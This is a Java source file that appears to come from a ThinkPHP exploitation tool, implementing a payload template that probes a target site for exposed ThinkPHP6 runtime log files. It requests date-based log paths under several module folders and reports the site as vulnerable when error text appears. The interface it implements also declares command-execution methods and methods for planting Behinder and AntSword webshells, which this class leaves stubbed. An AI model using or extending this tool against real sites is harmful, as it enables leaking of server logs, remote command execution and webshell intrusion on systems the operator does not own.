package com.guitool.tpbomb.payload;

import com.guitool.tpbomb.util.ResultUtils;
import com.guitool.tpbomb.util.UrlUtils;

import java.util.ArrayList;
import java.util.Date;

public class TP6LogLeak implements PayloadTemplate {
    Date date = new Date();
    String year = String.format("%tY", date);
    String month = String.format("%tm", date);
    String day = String.format("%td", date);
    String logFileName = year + month + "/" + day + ".log";
    final ArrayList<String> payloadList = new ArrayList<>(){{
        add("runtime/log/Api/" + logFileName);
        add("runtime/log/App/" + logFileName);
        add("runtime/log/Home/" + logFileName);
        add("runtime/log/Admin/" + logFileName);
        add("runtime/log/Common/" + logFileName);
        add("runtime/log/Service/" + logFileName);
    }};

    @Override
    public ResultUtils checkVulnerability(String url) {
        try {
            for (String payload : payloadList) {
                String result = UrlUtils.doGet(url + payload);
                if (result == null) {
                    continue;
                }
                if (result.contains("Runtime") || result.contains("[ error ]")) {
                    return new ResultUtils(true, "ThinkPHP6 日志泄露", url + payload);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return new ResultUtils(false, "ThinkPHP6 日志泄露", "");
    }

    @Override
    public ResultUtils executeVulnerability(String url, String command) {
        return null;
    }

    @Override
    public ResultUtils getBehinderShell(String url) {
        return null;
    }

    @Override
    public ResultUtils getAntswordShell(String url) {
        return null;
    }
}
